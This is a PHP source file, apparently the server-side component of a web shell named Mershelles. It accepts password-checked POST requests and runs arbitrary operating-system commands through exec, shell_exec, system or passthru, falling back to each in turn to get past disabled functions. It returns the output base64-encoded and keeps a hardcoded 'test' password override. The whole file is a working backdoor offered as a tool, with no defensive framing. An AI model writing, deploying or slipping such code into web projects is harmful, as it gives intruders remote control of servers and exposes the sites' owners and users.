<?php

$password = "@@PASSWORD@@";
$password = "test"; // todo remove
if ($password === "@@PASS" . "WORD@@") {
    $password = "";
}
define("PASSWORD", $password);

function respond($code, $data)
{
    $data = array_merge(array("cwd" => getcwd()), $data);
    $delimiter = $_POST["delimiter"];
    $start = "MERSHELLES_START_" . $delimiter;
    $end = "MERSHELLES_END_" . $delimiter;
    http_response_code($code);
    echo $start . base64_encode(json_encode($data)) . $end;
    die();
}

function error($message)
{
    respond(400, array("error" => $message));
}

function success($data)
{
    respond(200, array_merge(array("success" => true), $data));
}


function exec_cmd($cmd)
{
    try {
        if (function_exists("exec")) {
            exec($cmd, $output);
            $output = implode("\n", $output);
        } else if (function_exists("shell_exec")) {
            $output = shell_exec($cmd);
        } else if (function_exists("system")) {
            ob_start();
            system($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } else if (function_exists("passthru")) {
            ob_start();
            passthru($cmd);
            $output = ob_get_contents();
            ob_end_clean();
        } else {
            error("Command execution not possible, all functions disabled.");
            return null;
        }
    } catch (Exception $e) {
        return null;
    }

    return $output;
}

function handleExec()
{
    $cmd = $_POST["command"];

    if (substr($cmd, 0, 2) === "cd") {
        $dir = trim(substr($cmd, 2));
        if (is_dir($dir)) {
            chdir($dir);
            success(array("output" => ""));
        } else {
            error("Directory does not exist!");
        }
    }

    $output = exec_cmd($cmd);
    success(array("output" => $output));
}

function handleInit()
{
    respond(200, array(
        "version" => "1.0.0",
        "name" => "PHP",
        "description" => "PHP host for Mershelles",
        "author" => "Mershelles",
        "author_url" => ""
    ));
}

function checkAuth()
{
    if (PASSWORD === "") {
        return; // no auth needed
    }

    if ($_POST["password"] !== PASSWORD) {
        respond(401, array("error" => "Invalid password"));
    }
}

function handleAuth()
{
    if ($_POST["password"] === PASSWORD) {
        success(array());
    } else {
        error("Invalid password!");
    }
}


// handle api calls
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $type = $_POST["type"];

    // check password
    if ($type !== "auth") {
        checkAuth();
    }

    if (isset($_POST["cwd"]) && is_dir($_POST["cwd"])) {
        chdir($_POST["cwd"]);
    }


    switch ($type) {
        case "auth":
            handleAuth();
            break;
        case "init":
            handleInit();
            break;
        case "exec":
            handleExec();
            break;
        default:
            break;
    }
}
